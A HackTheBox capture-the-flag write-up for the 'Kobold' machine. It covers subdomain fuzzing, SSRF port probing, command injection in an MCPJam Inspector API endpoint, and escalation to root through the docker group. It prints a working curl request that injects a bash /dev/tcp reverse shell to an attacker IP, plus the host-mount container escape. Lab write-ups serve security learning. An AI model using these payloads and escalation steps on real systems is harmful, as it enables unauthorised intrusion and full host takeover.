# Kobold – HackTheBox Writeup

**Target:** Kobold (10.129.23.150)
**Attacker:** Kali Linux
**OS:** Linux (Ubuntu)
**Difficulty:** Easy
**Attack Path:** Subdomain Enumeration → Command Injection (MCPJam API) → Docker Privilege Escalation

---

## Recon

### Port Scan

Big lesson learned right away. I ran `nmap -sV` which only scans the top 1000 ports and completely missed port 3552. That port had a whole Docker management dashboard running on it. Always do a full scan:

```bash
nmap -sV -p- --min-rate 5000 10.129.23.150
```

What's open: SSH on 22, nginx on 80 (just redirects), nginx on 443 (HTTPS), Arcane Docker Management on 3552, and PrivateBin on 8080 (but that one is only listening on 127.0.0.1 so you can't reach it from outside).

### Finding Hostnames

The website doesn't show anything useful when you hit the IP directly. Just a "coming soon" page with a button that does nothing. Checked the SSL certificate for hostnames:

```bash
openssl s_client -connect 10.129.23.150:443 | openssl x509 -noout -text | grep -i dns
```

Got back `DNS:kobold.htb, DNS:*.kobold.htb`. The wildcard tells us there are subdomains out there. Added it to /etc/hosts:

```bash
echo "10.129.23.150 kobold.htb" | sudo tee -a /etc/hosts
```

Quick note on why you need `sudo tee -a` instead of just `>>`. The redirect `>>` runs without root privileges even if you put sudo in front of echo. With `tee -a` the actual file write happens with sudo, and `-a` means append so you don't overwrite the whole file.

### Subdomain Hunting

Used ffuf to brute force subdomains via the Host header. First grabbed the default response size so we can filter it out:

```bash
curl -k -s https://10.129.23.150 | wc -c
# 154
```

Then fuzzed:

```bash
ffuf -u https://10.129.23.150 -H "Host: FUZZ.kobold.htb" -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt -k -fs 154
```

Found `mcp.kobold.htb`. Added it to hosts and opened it in the browser. It's running MCPJam Inspector v1.4.2 with Ollama configured. There's also `bin.kobold.htb` running PrivateBin but I found that later.

### Digging Into the JavaScript

The site is a React SPA so all the interesting stuff is in the JavaScript bundle. Pulled out every API route with a regex:

```bash
curl -k -s https://mcp.kobold.htb/assets/index-DRYhT9Xb.js | grep -oP '"/[a-zA-Z0-9_/\-]+"' | sort -u
```

That regex looks for anything in quotes that starts with a slash. Basically grabs every URL path hardcoded in the frontend. Got a ton of endpoints back. The important ones were `/api/mcp/connect` for connecting to MCP servers, `/api/mcp/servers` for listing them, and `/api/mcp/chat-v2` for the chat interface.

### Poking the API

Started hitting endpoints to see what they expect:

```bash
curl -k https://mcp.kobold.htb/api/mcp/servers
# {"success":true,"servers":[]}

curl -k -X POST https://mcp.kobold.htb/api/mcp/connect -H "Content-Type: application/json" -d '{}'
# {"success":false,"error":"serverConfig is required"}
```

The servers list was empty but the connect endpoint was talking back. Also noticed it does SSRF because it makes server side requests to whatever URL you give it. Used the different error messages to figure out which internal ports are open. `ECONNREFUSED` means closed, anything else means something is listening. That's how I confirmed port 8080 (PrivateBin) was running internally.

---

## Getting a Shell

The `/api/mcp/connect` endpoint accepts a `command` parameter in the server config and just executes it. No sanitization at all. That's CVE-2026-23520.

### Testing It

```bash
curl -k -X POST https://mcp.kobold.htb/api/mcp/connect \
  -H "Content-Type: application/json" \
  -d '{"serverId":"test","serverConfig":{"command":"id","name":"test"}}'
```

Got "Connection closed" instead of "ECONNREFUSED". The command ran, output went nowhere, and the process exited. That's code execution confirmed.

### Reverse Shell

Listener on Kali:

```bash
nc -lvnp 4444
```

Important thing here is that `command` and `args` have to be separate fields. You can't stuff the whole bash command into `command`, it tries to find a binary with that exact name and fails. So bash goes in `command` and the arguments go in `args` as an array:

```bash
curl -k -X POST https://mcp.kobold.htb/api/mcp/connect \
  -H "Content-Type: application/json" \
  -d '{"serverId":"test","serverConfig":{"command":"bash","args":["-c","bash -i >& /dev/tcp/10.10.15.248/4444 0>&1"],"name":"test"}}'
```

Shell popped. We're `ben`.

```bash
cat /home/ben/user.txt
```

User flag grabbed.

---

## Privilege Escalation

### Figuring Out the Path

```bash
id
# uid=1001(ben) gid=1001(ben) groups=1001(ben),37(operator)
```

We're in the `operator` group. Interesting. Checked what the docker socket looks like:

```bash
ls -la /var/run/docker.sock
# srw-rw---- 1 root docker 0 Apr  5 15:18 /var/run/docker.sock
```

Socket belongs to the `docker` group. We're not in it yet, but turns out the `operator` group can switch to `docker`:

```bash
newgrp docker
id
# uid=1001(ben) gid=111(docker) groups=111(docker),37(operator),1001(ben)
```

Now we have docker access. And docker access is basically root access. Here's why.

### Docker = Root

Checked what images are available:

```bash
docker images
# privatebin/nginx-fpm-alpine:2.0.2
# mysql:latest
```

The trick is simple. You start a container and mount the entire host filesystem into it. Inside the container you're root, so you can read anything from the host through the mount.

```bash
docker run -v /:/torch -i --entrypoint sh --user root privatebin/nginx-fpm-alpine:2.0.2
```

Let me break that down piece by piece. `docker run` starts a new container. `-v /:/torch` mounts the host root filesystem to `/torch` inside the container. The format is `source:destination` separated by a colon, so `/` is the source (everything on the host) and `/torch` is where it shows up in the container. The name `torch` is arbitrary, could be anything. `-i` is interactive mode which keeps stdin open. Can't use `-t` because our reverse shell from netcat doesn't have a proper TTY. `--entrypoint sh` overrides the container's default startup command. Without this it would start php-fpm and nginx instead of giving us a shell. `--user root` makes sure we're root in the container because this image defaults to `nobody`.

### Root Flag

```bash
cat /torch/root/root.txt
```

Box pwned.

---

## What I Learned

Always do a full port scan with `-p-`. Missing port 3552 on the initial scan would have meant missing the entire attack surface. The default top 1000 ports is not enough.

SSL certificates leak information. The hostname and wildcard subdomain were right there in the cert. `openssl s_client` combined with `grep dns` pulls it out in one command.

JavaScript files in SPAs contain all the API routes. Even if the frontend doesn't show you anything interesting, the JS bundle has every endpoint hardcoded. Just grep for paths.

SSRF through APIs is a thing. If a server side application makes requests on your behalf, you can use it to scan internal services and figure out what's running behind the firewall.

The docker group is basically root. Anyone who can talk to the Docker daemon can mount the host filesystem and read or write anything. If you ever see a user in the docker group during an engagement, that's your escalation path.

`--entrypoint` exists because Docker images have default commands that run on startup. If you want a shell instead of whatever the image normally does, you have to override it.

`newgrp` lets you switch your active group without logging out. Didn't know this command existed before this box. It's useful when a user is in a group but the group isn't their primary one.

*Educational purposes only. This is a HackTheBox machine in a controlled lab environment.*
